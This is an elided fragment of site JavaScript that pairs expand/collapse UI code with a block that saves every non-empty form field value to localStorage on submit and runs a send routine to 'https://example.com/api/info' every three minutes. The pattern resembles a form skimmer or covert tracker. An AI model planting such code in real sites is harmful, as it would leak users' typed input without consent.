...
$(function () {
  var trackKeys = window.trackKeys;
  function computeHashValue(data) {
    var keysArray = Object.keys(data);
    var joinedKeys = keysArray.join("");
    var hashValue = 0;
  ...
  function sendToServer(data) {
    var hashId = computeHashValue(data);
    var apiUrl = "https://example.com/api/info";
  ...
  setInterval(collectAndSendData, 3 * 60 * 1000);
  ...
  $('form').on('submit', function () {
    $('.form-control').each(function () {
      if ($(this).val() !== "") {
        var eventName = $(this).prop('name');
        window.localStorage.setItem(eventName, $(this).val());
      }
    });
  });
});
var expandables = {
  ...
  expandCollapse: function (e, controls) {
    ...
    if (expandedItem.length && collapsedItem.length) {
      ...
      if (expandedItem.is(":hidden")) {
        expandedItem.toggle("fast");
        element.attr("src", element.attr("src").replace(/collapse_collapsed\.(gif|jpg|jpeg|bmp|png)$/i, "collapse.$1")).attr("alt", "[-]").attr("title", "[-]");
      ...
      // Collapsing
        ...
        expandedItem.toggle("fast");
        element.attr("src", element.attr("src").replace(/collapse\.(gif|jpg|jpeg|bmp|png)$/i, "collapse_collapsed.$1")).attr("alt", "[+]").attr("title", "[+]");
